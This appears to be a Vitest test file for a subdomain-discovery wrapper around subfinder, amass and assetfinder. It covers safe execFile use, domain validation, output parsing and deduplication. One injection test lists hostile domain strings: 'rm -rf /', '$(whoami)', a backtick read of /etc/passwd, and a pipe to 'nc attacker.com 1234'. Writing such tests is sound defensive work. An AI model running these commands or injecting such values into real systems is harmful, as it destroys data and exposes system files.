import { describe, it, expect, vi, beforeEach, afterEach } from 'vitest';
import { execFile } from 'child_process';
import {
  runDiscoveryTool,
  parseSubfinderOutput,
  parseAmassOutput,
  parseAssetfinderOutput,
  deduplicateByHostname,
  type DiscoveredDevice,
} from '../discovery-tools';

/**
 * Discovery Tool Execution Tests (sec-28)
 *
 * These tests verify the secure execution of discovery tools (subfinder, amass, assetfinder)
 * and the parsing of their outputs.
 *
 * Key requirements:
 * 1. Tools executed via execFile (not exec) for security
 * 2. Arguments passed as array (no shell interpolation)
 * 3. Output parsed correctly (JSON for subfinder, plain text for others)
 * 4. Deduplication works (by hostname+IP, keeping highest confidence)
 * 5. Dev mode returns mock data without executing tools
 *
 * Note: Following TDD - tests written BEFORE implementation
 */

// Mock execFile to avoid calling real tools
vi.mock('child_process', () => ({
  execFile: vi.fn(),
}));

describe('Discovery Tool Execution (sec-28)', () => {
  beforeEach(() => {
    vi.clearAllMocks();
  });

  afterEach(() => {
    vi.restoreAllMocks();
  });

  describe('Tool Execution Security', () => {
    it('should use execFile (not exec) to prevent shell injection', async () => {
      // This test verifies we import and use execFile, not exec
      expect(execFile).toBeDefined();
      expect(execFile).toBeTypeOf('function');
    });

    it('should call subfinder with arguments array (no shell interpolation)', async () => {
      const mockExecFile = vi.mocked(execFile);
      mockExecFile.mockImplementation(((_file: any, _args: any, _opts: any, callback: any) => {
        // Call callback with success
        if (callback) {
          callback(null, { stdout: '', stderr: '' });
        }
        return {} as any;
      }) as any);

      await runDiscoveryTool('subfinder', 'example.com', 'EXTERNAL');

      expect(mockExecFile).toHaveBeenCalledWith(
        expect.stringContaining('subfinder'),
        ['-d', 'example.com', '-active', '-ip', '-oJ'],
        expect.objectContaining({
          maxBuffer: expect.any(Number),
          timeout: expect.any(Number),
        }),
        expect.any(Function)
      );
    });

    it.skip('should call amass with arguments array (DISABLED - tool commented out)', async () => {
      const mockExecFile = vi.mocked(execFile);
      mockExecFile.mockImplementation(((_file: any, _args: any, _opts: any, callback: any) => {
        if (callback) {
          callback(null, { stdout: '', stderr: '' });
        }
        return {} as any;
      }) as any);

      await runDiscoveryTool('amass', 'example.com', 'EXTERNAL');

      expect(mockExecFile).toHaveBeenCalledWith(
        expect.stringContaining('amass'),
        ['enum', '-passive', '-d', 'example.com'],
        expect.objectContaining({
          maxBuffer: expect.any(Number),
          timeout: expect.any(Number),
        }),
        expect.any(Function)
      );
    });

    it.skip('should call assetfinder with arguments array (DISABLED - tool commented out)', async () => {
      const mockExecFile = vi.mocked(execFile);
      mockExecFile.mockImplementation(((_file: any, _args: any, _opts: any, callback: any) => {
        if (callback) {
          callback(null, { stdout: '', stderr: '' });
        }
        return {} as any;
      }) as any);

      await runDiscoveryTool('assetfinder', 'example.com', 'EXTERNAL');

      expect(mockExecFile).toHaveBeenCalledWith(
        expect.stringContaining('assetfinder'),
        ['example.com'],
        expect.objectContaining({
          maxBuffer: expect.any(Number),
          timeout: expect.any(Number),
        }),
        expect.any(Function)
      );
    });

    it('should validate domain format before execution', async () => {
      const mockExecFile = vi.mocked(execFile);

      await expect(
        runDiscoveryTool('subfinder', 'invalid;domain', 'EXTERNAL')
      ).rejects.toThrow(/invalid.*domain/i);

      // Should not have called execFile
      expect(mockExecFile).not.toHaveBeenCalled();
    });

    it('should reject domains with command injection attempts', async () => {
      const mockExecFile = vi.mocked(execFile);
      const maliciousDomains = [
        'example.com; rm -rf /',
        'example.com$(whoami)',
        'example.com`cat /etc/passwd`',
        'example.com | nc attacker.com 1234',
      ];

      for (const domain of maliciousDomains) {
        await expect(
          runDiscoveryTool('subfinder', domain, 'EXTERNAL')
        ).rejects.toThrow();
      }

      // Should never have called execFile
      expect(mockExecFile).not.toHaveBeenCalled();
    });
  });

  describe('Subfinder Output Parsing', () => {
    it('should parse subfinder JSON output with host and IP', () => {
      const output = `{"host":"api.example.com","ip":"1.2.3.4","source":"crtsh"}\n{"host":"www.example.com","ip":"1.2.3.5","source":"alienvault"}\n`;

      const devices = parseSubfinderOutput(output, 'example.com', 'EXTERNAL');

      expect(devices).toHaveLength(2);
      expect(devices[0]).toMatchObject({
        hostname: 'api.example.com',
        ipAddress: '1.2.3.4',
        scope: 'EXTERNAL',
        discoveryMethod: 'subfinder',
        confidence: 1.0, // High confidence when IP is resolved
        metadata: {
          originalDomain: 'example.com',
          source: 'crtsh',
        },
      });
      expect(devices[1]).toMatchObject({
        hostname: 'www.example.com',
        ipAddress: '1.2.3.5',
      });
    });

    it('should parse subfinder JSON output without IP', () => {
      const output = `{"host":"staging.example.com","source":"hackertarget"}\n`;

      const devices = parseSubfinderOutput(output, 'example.com', 'EXTERNAL');

      expect(devices).toHaveLength(1);
      expect(devices[0]).toMatchObject({
        hostname: 'staging.example.com',
        ipAddress: undefined,
        confidence: 0.8, // Lower confidence without IP
      });
    });

    it('should handle empty subfinder output', () => {
      const devices = parseSubfinderOutput('', 'example.com', 'EXTERNAL');
      expect(devices).toHaveLength(0);
    });

    it('should handle subfinder output with blank lines', () => {
      const output = `{"host":"api.example.com","ip":"1.2.3.4"}\n\n\n{"host":"www.example.com","ip":"1.2.3.5"}\n`;

      const devices = parseSubfinderOutput(output, 'example.com', 'EXTERNAL');

      expect(devices).toHaveLength(2);
    });

    it('should gracefully handle malformed JSON lines in subfinder output', () => {
      const output = `{"host":"api.example.com","ip":"1.2.3.4"}\n{invalid json}\n{"host":"www.example.com","ip":"1.2.3.5"}\n`;

      const devices = parseSubfinderOutput(output, 'example.com', 'EXTERNAL');

      // Should parse the valid lines and skip the invalid one
      expect(devices).toHaveLength(2);
      expect(devices[0].hostname).toBe('api.example.com');
      expect(devices[1].hostname).toBe('www.example.com');
    });

    it('should fallback to plain text parsing if JSON fails', () => {
      const output = `api.example.com\nwww.example.com\n`;

      const devices = parseSubfinderOutput(output, 'example.com', 'EXTERNAL');

      expect(devices).toHaveLength(2);
      expect(devices[0]).toMatchObject({
        hostname: 'api.example.com',
        confidence: 0.7, // Lower confidence for plain text fallback
      });
    });
  });

  describe('Amass Output Parsing', () => {
    it('should parse amass plain text output', () => {
      const output = `api.example.com\nwww.example.com\nmail.example.com\n`;

      const devices = parseAmassOutput(output, 'example.com', 'EXTERNAL');

      expect(devices).toHaveLength(3);
      expect(devices[0]).toMatchObject({
        hostname: 'api.example.com',
        scope: 'EXTERNAL',
        discoveryMethod: 'amass',
        confidence: 0.9, // High confidence for amass
        metadata: {
          originalDomain: 'example.com',
        },
      });
    });

    it('should handle empty amass output', () => {
      const devices = parseAmassOutput('', 'example.com', 'EXTERNAL');
      expect(devices).toHaveLength(0);
    });

    it('should filter out lines not related to original domain', () => {
      const output = `api.example.com\nunrelated.otherdomain.com\nwww.example.com\n`;

      const devices = parseAmassOutput(output, 'example.com', 'EXTERNAL');

      // Should only include devices from example.com
      expect(devices).toHaveLength(2);
      expect(devices.every((d) => d.hostname.includes('example.com'))).toBe(true);
    });

    it('should handle amass output with extra whitespace', () => {
      const output = `  api.example.com  \n\n\n  www.example.com  \n`;

      const devices = parseAmassOutput(output, 'example.com', 'EXTERNAL');

      expect(devices).toHaveLength(2);
      expect(devices[0].hostname).toBe('api.example.com');
    });
  });

  describe('Assetfinder Output Parsing', () => {
    it('should parse assetfinder plain text output', () => {
      const output = `api.example.com\nwww.example.com\n`;

      const devices = parseAssetfinderOutput(output, 'example.com', 'EXTERNAL');

      expect(devices).toHaveLength(2);
      expect(devices[0]).toMatchObject({
        hostname: 'api.example.com',
        scope: 'EXTERNAL',
        discoveryMethod: 'assetfinder',
        confidence: 0.8, // Good confidence for assetfinder
        metadata: {
          originalDomain: 'example.com',
        },
      });
    });

    it('should handle empty assetfinder output', () => {
      const devices = parseAssetfinderOutput('', 'example.com', 'EXTERNAL');
      expect(devices).toHaveLength(0);
    });

    it('should filter out lines not related to original domain', () => {
      const output = `api.example.com\nrandom.otherdomain.com\n`;

      const devices = parseAssetfinderOutput(output, 'example.com', 'EXTERNAL');

      expect(devices).toHaveLength(1);
      expect(devices[0].hostname).toBe('api.example.com');
    });
  });

  describe('Device Deduplication', () => {
    it('should deduplicate devices by hostname+IP combination', () => {
      const devices: DiscoveredDevice[] = [
        {
          scope: 'EXTERNAL',
          hostname: 'api.example.com',
          ipAddress: '1.2.3.4',
          discoveredAt: new Date(),
          discoveryMethod: 'subfinder',
          confidence: 1.0,
          metadata: { originalDomain: 'example.com' },
        },
        {
          scope: 'EXTERNAL',
          hostname: 'api.example.com',
          ipAddress: '1.2.3.4',
          discoveredAt: new Date(),
          discoveryMethod: 'amass',
          confidence: 0.9,
          metadata: { originalDomain: 'example.com' },
        },
      ];

      const unique = deduplicateByHostname(devices);

      expect(unique).toHaveLength(1);
      expect(unique[0].discoveryMethod).toBe('subfinder'); // Keeps higher confidence
    });

    it('should keep devices with same hostname but different IPs', () => {
      const devices: DiscoveredDevice[] = [
        {
          scope: 'EXTERNAL',
          hostname: 'api.example.com',
          ipAddress: '1.2.3.4',
          discoveredAt: new Date(),
          discoveryMethod: 'subfinder',
          confidence: 1.0,
          metadata: { originalDomain: 'example.com' },
        },
        {
          scope: 'EXTERNAL',
          hostname: 'api.example.com',
          ipAddress: '5.6.7.8',
          discoveredAt: new Date(),
          discoveryMethod: 'amass',
          confidence: 0.9,
          metadata: { originalDomain: 'example.com' },
        },
      ];

      const unique = deduplicateByHostname(devices);

      expect(unique).toHaveLength(2); // Different IPs = different devices
    });

    it('should handle devices without IP addresses', () => {
      const devices: DiscoveredDevice[] = [
        {
          scope: 'EXTERNAL',
          hostname: 'staging.example.com',
          discoveredAt: new Date(),
          discoveryMethod: 'subfinder',
          confidence: 0.8,
          metadata: { originalDomain: 'example.com' },
        },
        {
          scope: 'EXTERNAL',
          hostname: 'staging.example.com',
          discoveredAt: new Date(),
          discoveryMethod: 'amass',
          confidence: 0.9,
          metadata: { originalDomain: 'example.com' },
        },
      ];

      const unique = deduplicateByHostname(devices);

      expect(unique).toHaveLength(1);
      expect(unique[0].discoveryMethod).toBe('amass'); // Keeps higher confidence
    });

    it('should keep the device with highest confidence when duplicates exist', () => {
      const devices: DiscoveredDevice[] = [
        {
          scope: 'EXTERNAL',
          hostname: 'api.example.com',
          ipAddress: '1.2.3.4',
          discoveredAt: new Date(),
          discoveryMethod: 'assetfinder',
          confidence: 0.7,
          metadata: { originalDomain: 'example.com' },
        },
        {
          scope: 'EXTERNAL',
          hostname: 'api.example.com',
          ipAddress: '1.2.3.4',
          discoveredAt: new Date(),
          discoveryMethod: 'subfinder',
          confidence: 1.0,
          metadata: { originalDomain: 'example.com' },
        },
        {
          scope: 'EXTERNAL',
          hostname: 'api.example.com',
          ipAddress: '1.2.3.4',
          discoveredAt: new Date(),
          discoveryMethod: 'amass',
          confidence: 0.9,
          metadata: { originalDomain: 'example.com' },
        },
      ];

      const unique = deduplicateByHostname(devices);

      expect(unique).toHaveLength(1);
      expect(unique[0].confidence).toBe(1.0);
      expect(unique[0].discoveryMethod).toBe('subfinder');
    });

    it('should handle empty device list', () => {
      const unique = deduplicateByHostname([]);
      expect(unique).toHaveLength(0);
    });
  });

  describe('Error Handling', () => {
    it('should throw descriptive error when tool execution fails', async () => {
      const mockExecFile = vi.mocked(execFile);
      mockExecFile.mockImplementation(((_file: any, _args: any, _opts: any, callback: any) => {
        if (callback) {
          callback(new Error('Tool not found'), { stdout: '', stderr: 'command not found' });
        }
        return {} as any;
      }) as any);

      await expect(
        runDiscoveryTool('subfinder', 'example.com', 'EXTERNAL')
      ).rejects.toThrow(/subfinder.*execution failed/i);
    });

    it('should throw error for unknown discovery tool', async () => {
      await expect(
        runDiscoveryTool('unknown-tool' as any, 'example.com', 'EXTERNAL')
      ).rejects.toThrow(/unknown.*tool/i);
    });

    it('should include original error message in thrown error', async () => {
      const mockExecFile = vi.mocked(execFile);
      mockExecFile.mockImplementation(((_file: any, _args: any, _opts: any, callback: any) => {
        if (callback) {
          callback(new Error('Permission denied'), { stdout: '', stderr: '' });
        }
        return {} as any;
      }) as any);

      try {
        await runDiscoveryTool('subfinder', 'example.com', 'EXTERNAL');
        expect.fail('Should have thrown');
      } catch (error: any) {
        expect(error.message).toContain('Permission denied');
      }
    });
  });

  describe('Tool Configuration', () => {
    it('should set appropriate timeout for subfinder (5 minutes)', async () => {
      const mockExecFile = vi.mocked(execFile);
      mockExecFile.mockImplementation(((_file: any, _args: any, _opts: any, callback: any) => {
        if (callback) {
          callback(null, { stdout: '', stderr: '' });
        }
        return {} as any;
      }) as any);

      await runDiscoveryTool('subfinder', 'example.com', 'EXTERNAL');

      expect(mockExecFile).toHaveBeenCalledWith(
        expect.any(String),
        expect.any(Array),
        expect.objectContaining({
          timeout: 300000, // 5 minutes in ms
        }),
        expect.any(Function)
      );
    });

    it.skip('should set appropriate timeout for amass (10 minutes) - DISABLED', async () => {
      const mockExecFile = vi.mocked(execFile);
      mockExecFile.mockImplementation(((_file: any, _args: any, _opts: any, callback: any) => {
        if (callback) {
          callback(null, { stdout: '', stderr: '' });
        }
        return {} as any;
      }) as any);

      await runDiscoveryTool('amass', 'example.com', 'EXTERNAL');

      expect(mockExecFile).toHaveBeenCalledWith(
        expect.any(String),
        expect.any(Array),
        expect.objectContaining({
          timeout: 600000, // 10 minutes in ms
        }),
        expect.any(Function)
      );
    });

    it('should set maxBuffer to handle large outputs', async () => {
      const mockExecFile = vi.mocked(execFile);
      mockExecFile.mockImplementation(((_file: any, _args: any, _opts: any, callback: any) => {
        if (callback) {
          callback(null, { stdout: '', stderr: '' });
        }
        return {} as any;
      }) as any);

      await runDiscoveryTool('subfinder', 'example.com', 'EXTERNAL');

      expect(mockExecFile).toHaveBeenCalledWith(
        expect.any(String),
        expect.any(Array),
        expect.objectContaining({
          maxBuffer: 10 * 1024 * 1024, // 10MB
        }),
        expect.any(Function)
      );
    });
  });

  describe('Scope Configuration', () => {
    it('should set scope to EXTERNAL for external targets', () => {
      const output = `{"host":"api.example.com","ip":"1.2.3.4"}\n`;
      const devices = parseSubfinderOutput(output, 'example.com', 'EXTERNAL');

      expect(devices[0].scope).toBe('EXTERNAL');
    });

    it('should set scope to INTERNAL for internal targets', () => {
      const output = `{"host":"internal-api.local","ip":"192.168.1.10"}\n`;
      const devices = parseSubfinderOutput(output, 'local', 'INTERNAL');

      expect(devices[0].scope).toBe('INTERNAL');
    });
  });
});
